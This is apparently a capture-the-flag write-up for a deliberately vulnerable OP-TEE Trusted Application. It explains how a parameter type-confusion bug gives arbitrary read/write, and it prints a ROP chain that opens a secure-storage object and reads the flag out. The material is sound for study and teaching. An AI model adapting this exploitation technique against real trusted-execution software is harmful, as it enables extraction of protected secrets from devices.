
# Overview

In this task participants are given a vulnerable OP-TEE Trusted Application (TA). The goal is to extract a flag from secure storage.

# Vulnerability

While the general logic of the TA is sound, it contains a vulnerability in the way it handles user input. Specifically, the TA does not properly validate the provided types when accessing `tee_params`. This allows user to pass a `TEEC_VALUE_INOUT` parameter where a `TEE_PARAM_TYPE_MEMREF_INOUT` is expected. With this an arbitrary read/write primitive can be achieved.

# Exploitation

Now the task is to utilize this to actually achieve arbitrary code execution. As we can't allocate executable memory in the TA, we have to write a ROP chain. Luckily for us, ASLR is turned off, so the stack addresses are predictable, and it's possible to directly write our ROP chain to the normal stack.

The goal of the ROP is to perform two calls: `OpenPersistentObjectWrapper` to get a handle to the secure storage object, and `TEE_ReadObjectData` to read the flag from the secure storage. Note here, that the parameters for these functions can't directly use shared memory buffers, so we have to write the parameters somewhere in the secure memory.

```c
TEE_Result __cdecl OpenPersistentObjectWrapper(
      TEE_ObjectHandle *object,
      const unsigned __int8 *obj_id,
      size_t obj_id_sz,
      uint32_t obj_data_flag)

res = TEE_ReadObjectData(object, data, 0x100, &read_bytes);
```

With this in place, the ropchain looks as follows:

```c
const uint32_t pop_r0_r1_r2_r3_pop_ip_pc = ta_code_base + 0x00001f84;
const uint32_t memcpy_unchecked =
    ta_code_base + 0x11AE4 | 1; // Skip `STRD.W R7, LR, [SP,#var_8]!`
const uint32_t openpersistentobjectwrapper =
    ta_code_base + 0x61c | 1; // Skip `STRD.W R7, LR, [SP, #-8]!`
const uint32_t tee_read_object_data =
    ta_code_base + 0x5A28 | 1; // Skip `STRD.W R7, LR, [SP,#var_8]!`
+
char *rop_chain_start = buf;
// Open the persistent object.
P32(pop_r0_r1_r2_r3_pop_ip_pc, rop_chain_start);
P32(stack_base + offsetof(RopData_t, object_handle), rop_chain_start); // r0
P32(stack_base + offsetof(RopData_t, object_id), rop_chain_start);     // r1
P32(sizeof(((RopData_t *)0)->object_id), rop_chain_start);             // r2
P32(0x11, rop_chain_start);                                            // r3
P32(0x45454545, rop_chain_start);                                      // ip
P32(openpersistentobjectwrapper, rop_chain_start);                     // pc

// Dereference the object handle. Basically use memcpy, to copy the value from
// the stack_base + 0x26a8, to our current part of the rop-chain.
P32(0x41414141, rop_chain_start);
P32(pop_r0_r1_r2_r3_pop_ip_pc, rop_chain_start);
P32(stack_base + 0x26a8, rop_chain_start);                             // r0
P32(stack_base + offsetof(RopData_t, object_handle), rop_chain_start); // r1
P32(sizeof(((RopData_t *)0)->object_handle), rop_chain_start);         // r2
P32(0x41414141, rop_chain_start);                                      // r3
P32(0x41414141, rop_chain_start);                                      // ip
P32(memcpy_unchecked, rop_chain_start);                                // pc

P32(0x41414141, rop_chain_start); // r7
P32(pop_r0_r1_r2_r3_pop_ip_pc, rop_chain_start);
P32(0x41424344, rop_chain_start); // r0 = object_handle (dummy value, replaced in the rop-chain using memcpy call)
P32(stack_base + offsetof(RopData_t, flag_bytes), rop_chain_start);      // r1 = data buffer
P32(128, rop_chain_start); // r2 = data size
P32(stack_base + offsetof(RopData_t, read_bytes), rop_chain_start); // r3 = actual bytes read
P32(0x41414141, rop_chain_start);           // ip
P32(tee_read_object_data, rop_chain_start); // pc

// Copy the object data to the output buffer.
P32(0x41414141, rop_chain_start);
P32(pop_r0_r1_r2_r3_pop_ip_pc, rop_chain_start);
P32(input_param_location + 0x01b8, rop_chain_start); // r0 = input_param_location
P32(stack_base + offsetof(RopData_t, flag_bytes), rop_chain_start); // r1 = stack_base + offsetof(RopData_t, flag_bytes)
P32(sizeof(((RopData_t *)0)->flag_bytes), rop_chain_start); // r2 = 128
P32(0x41414141, rop_chain_start);                           // r3 = 0x41414141
P32(0x41414141, rop_chain_start);                           // ip
P32(memcpy_unchecked, rop_chain_start);                     // pc
```

Consult exploit code for more details.
